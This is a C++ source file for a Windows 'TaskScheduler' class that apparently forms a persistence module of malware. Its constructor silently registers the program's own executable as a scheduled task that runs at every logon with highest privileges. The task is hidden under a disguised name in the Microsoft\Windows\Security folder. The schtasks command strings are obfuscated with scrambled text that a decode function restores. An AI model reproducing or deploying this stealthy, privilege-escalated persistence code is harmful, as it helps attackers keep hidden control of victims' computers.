#include "TaskScheduler.h"

TaskScheduler::TaskScheduler()
{
	this->createTask();
}

// Check if task exists in the Thask Scheduler (Administrator Required)
BOOL TaskScheduler::isTaskExists(const std::string & task_name)
{
	if (Tools::CMD(Tools::decode("crMi \"TN /ryue/Qs sktach\\styricuSes\\owndWit\\ofos") + task_name + "\"").find(task_name) != std::string::npos) // decode -> schtasks /Query /TN \"Microsoft\\Windows\\Security\\.
		return TRUE;
	return FALSE;
}

BOOL TaskScheduler::createTask(std::string binary_path, std::string task_name)
{
	if (binary_path == "")
		binary_path = Tools::GetThisProgramPath();
	if (task_name == "")
		task_name = HIDE_NAME;

	if (binary_path != "")
	{
		// Create Task using a CMD command in the folder "Task Scheduler Library/Microsoft/Windows/Security"
		std::string sch_command = Tools::decode("/TN GOLOONC /Se atre/Cs sktach\\styricuSes\\owndWit\\ofoscrMi \"N") + task_name + "\" /TR \"" + binary_path + "\" " + Tools::decode("HIL /RSTHEG"); // decode -> schtasks /Create /SC ONLOGON /TN \"Microsoft\\Windows\\Security\\ , /RL HIGHEST
		if (!this->isTaskExists(task_name))
			if (Tools::CMD(sch_command).find("SUCCESS") != std::string::npos)
				return TRUE;
	}

	return FALSE;
}

BOOL TaskScheduler::deleteTask(const std::string& task_name)
{
	if (task_name != "")
		if (Tools::CMD(Tools::decode("/Ds sktachNs/Te etel") + " " + task_name + " /F").find("SUCCESS") != std::string::npos) // decode -> schtasks /Delete /TN
			return TRUE;

	return FALSE;
}